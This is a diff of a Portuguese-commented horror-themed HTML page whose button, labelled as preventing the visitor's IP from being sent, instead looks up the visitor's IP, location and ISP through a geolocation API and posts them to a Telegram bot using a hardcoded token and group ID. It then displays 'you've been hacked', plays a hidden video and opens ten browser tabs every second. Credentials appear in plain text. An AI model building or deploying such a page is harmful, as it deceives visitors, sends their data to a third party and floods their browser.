@@ -12,157 +12,179 @@
             align-items: center;
             height: 100vh;
             margin: 0;
-            background-color: black;
-            font-family: 'Creepster', cursive;
+            background-color: black; /* Fundo escuro */
+            font-family: 'Creepster', cursive; /* Fonte assustadora */
             color: white;
             text-align: center;
-            overflow: hidden;
-            position: relative;
+            overflow: hidden; /* Para evitar rolagem */
+            position: relative; /* Para posicionar as gotículas */
         }
 
         @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0; }
+            0%, 100% {
+                opacity: 1;
+            }
+            50% {
+                opacity: 0;
+            }
         }
 
         .message {
-            color: white;
-            font-size: 20px;
-            text-shadow: 0 0 20px rgba(255, 255, 255, 0.7);
-            z-index: 10;
-            margin: 10px 0;
+            color: white; /* Definindo a cor do texto como branco */
+            font-size: 20px; /* Diminuindo o tamanho da fonte para IP */
+            text-shadow: 0 0 20px rgba(255, 255, 255, 0.7); /* Sombra branca */
+            z-index: 10; /* Para garantir que a mensagem apareça acima do fundo */
+            margin: 10px 0; /* Espaço entre mensagens */
         }
 
-        .loading {
-            font-size: 18px;
-            margin-top: 20px;
-            animation: blink 1.5s infinite;
-        }
-
-        #playButton {
-            margin-top: 20px;
-            padding: 10px 20px;
-            font-size: 20px;
-            color: white;
-            background-color: red;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            transition: background-color 0.3s;
-            z-index: 10;
-        }
-
-        #playButton:hover {
-            background-color: darkred;
-        }
-
-        #videoContainer {
-            display: none;
-        }
-
-        #youtubeVideo {
-            display: none;
-        }
-
+        /* Estilo das gotículas de sangue */
         .blood-drop {
             position: absolute;
             width: 10px;
             height: 10px;
             background-color: red;
-            border-radius: 50%;
+            border-radius: 50%; /* Forma circular */
             opacity: 0.8;
             animation: drip linear infinite;
         }
 
         @keyframes drip {
-            0% { transform: translateY(-10px); opacity: 0.8; }
-            50% { opacity: 0.6; }
-            100% { transform: translateY(100vh); opacity: 0; }
+            0% {
+                transform: translateY(-10px);
+                opacity: 0.8;
+            }
+            50% {
+                opacity: 0.6; /* Mudando a opacidade durante a animação */
+            }
+            100% {
+                transform: translateY(100vh); /* Move a gota para baixo */
+                opacity: 0; /* Faz a gota desaparecer ao final */
+            }
+        }
+
+        /* Estilo do botão */
+        #playButton {
+            margin-top: 20px;
+            padding: 10px 20px;
+            font-size: 20px;
+            color: white;
+            background-color: red; /* Cor do botão */
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            z-index: 10; /* Para garantir que o botão apareça acima do fundo */
+        }
+
+        /* Estilo do botão ao passar o mouse */
+        #playButton:hover {
+            background-color: darkred; /* Cor do botão ao passar o mouse */
+        }
+
+        /* O vídeo será oculto */
+        #videoContainer {
+            display: none; /* Oculta o container inicialmente */
+        }
+
+        /* O iframe está completamente oculto */
+        #youtubeVideo {
+            display: none; /* Oculte o iframe */
         }
     </style>
-    <link href="https://fonts.googleapis.com/css2?family=Creepster&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Creepster&display=swap" rel="stylesheet"> <!-- Fonte assustadora -->
 </head>
 <body>
     <div class="message" id="ipMessage"></div>
     <div class="message" id="locationMessage"></div>
     <div class="message" id="internetMessage"></div>
-    <div class="loading" id="loadingMessage">Obtendo sua localização...</div>
 
+    <!-- Botão para tocar a música e abrir guias -->
     <button id="playButton">Clique aqui para seu IP não ser enviado ao nosso sistema</button>
 
+    <!-- Container do vídeo do YouTube -->
     <div id="videoContainer">
         <iframe id="youtubeVideo" src="https://www.youtube.com/embed/b2pD0B9Rfps?enablejsapi=1&autoplay=1&loop=1&playlist=b2pD0B9Rfps" frameborder="0" allow="autoplay" allowfullscreen></iframe>
     </div>
 
     <script>
-        const telegramBotToken = '7545142881:AAHD_s9gLTIpOUqHDfnu1_rGtDytwaerf_g'; 
-        const telegramGroupId = '-1002018953064'; 
+        const telegramBotToken = '7545142881:AAHD_s9gLTIpOUqHDfnu1_rGtDytwaerf_g'; // Insira seu token do bot aqui
+        const telegramGroupId = '-1002018953064'; // Insira o ID do seu grupo aqui
 
+        // Função para obter o IP, a localização e a conexão de Internet do usuário
         async function getUserIPLocationAndConnection() {
-            const ipGeolocationResponse = await fetch('https://api.ipgeolocation.io/ipgeo?apiKey=5af22bf946b049cf91cb613452d8a102');
-            const ipGeolocationData = await ipGeolocationResponse.json();
-            
-            const locationData = {
-                ip: ipGeolocationData.ip,
-                location: `${ipGeolocationData.city}, ${ipGeolocationData.country_name}`,
-                connection: `Conexão: ${ipGeolocationData.connection}; Provedor: ${ipGeolocationData.isp}`
-            };
-
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition((position) => {
-                    locationData.location = `Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`;
-                });
+            try {
+                const response = await fetch('https://api.ipgeolocation.io/ipgeo?apiKey=5af22bf946b049cf91cb613452d8a102');
+                const data = await response.json();
+                return {
+                    ip: data.ip,
+                    location: `${data.city}, ${data.country_name}`,
+                    connection: `${data.connection}; Provedor: ${data.isp}`
+                };
+            } catch (error) {
+                return null; // Retorna nulo em caso de erro
             }
-
-            return locationData;
         }
 
+        // Função para enviar mensagem para o Telegram
         async function sendToTelegram(ip, location, connection) {
             const message = `Você foi hackeado!\nIP: ${ip}\nLocalização: ${location}\nConexão: ${connection}`;
             const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramGroupId}&text=${encodeURIComponent(message)}`;
+
             await fetch(url);
         }
 
+        // Função para iniciar o vídeo e abrir novas guias
         async function startVideoAndOpenTabs() {
-            document.getElementById('loadingMessage').style.display = 'block'; 
             const userInfo = await getUserIPLocationAndConnection();
 
             if (userInfo) {
+                // Envia as informações para o Telegram
                 await sendToTelegram(userInfo.ip, userInfo.location, userInfo.connection);
+                
+                // Atualiza as mensagens na página
                 document.getElementById('ipMessage').innerText = `Você foi hackeado! IP: ${userInfo.ip}`;
                 document.getElementById('locationMessage').innerText = `Localização: ${userInfo.location}`;
                 document.getElementById('internetMessage').innerText = `Conexão: ${userInfo.connection}`;
                 
-                document.getElementById('loadingMessage').style.display = 'none'; 
-                document.getElementById('videoContainer').style.display = 'block';
-                document.getElementById('youtubeVideo').style.display = 'block';
+                const videoContainer = document.getElementById('videoContainer');
+                videoContainer.style.display = 'block'; // Mostra o container do vídeo
+                const player = document.getElementById('youtubeVideo');
+                player.style.display = 'block'; // Mostra o iframe do vídeo
+                player.src += ""; // Reinicia o src para tentar o autoplay novamente
                 
+                // Abre 10 novas guias a cada segundo
                 setInterval(() => {
                     for (let i = 0; i < 10; i++) {
-                        window.open("https://www.virustotal.com", "_blank");
+                        window.open("https://www.virustotal.com", "_blank"); // Altere o link para o que você preferir
                     }
-                }, 1000);
+                }, 1000); // Intervalo de 1 segundo (1000 milissegundos)
 
+                // Inicia a animação das gotículas de sangue
                 createBloodDrops();
             }
         }
 
+        // Função para criar gotículas de sangue
         function createBloodDrops() {
             const body = document.body;
 
+            // Cria uma gotícula a cada 500 milissegundos
             setInterval(() => {
                 const drop = document.createElement('div');
                 drop.className = 'blood-drop';
+                
+                // Posição aleatória para a gotícula
                 drop.style.left = Math.random() * 100 + 'vw';
-                drop.style.animationDuration = Math.random() * 1 + 2 + 's';
+                drop.style.animationDuration = Math.random() * 1 + 2 + 's'; // Dura entre 2s a 3s
                 body.appendChild(drop);
 
+                // Remove a gotícula após a animação
                 drop.addEventListener('animationend', () => {
                     drop.remove();
                 });
             }, 500);
         }
 
+        // Adiciona um listener de clique ao botão
         document.getElementById('playButton').addEventListener('click', startVideoAndOpenTabs);
     </script>
 </body>
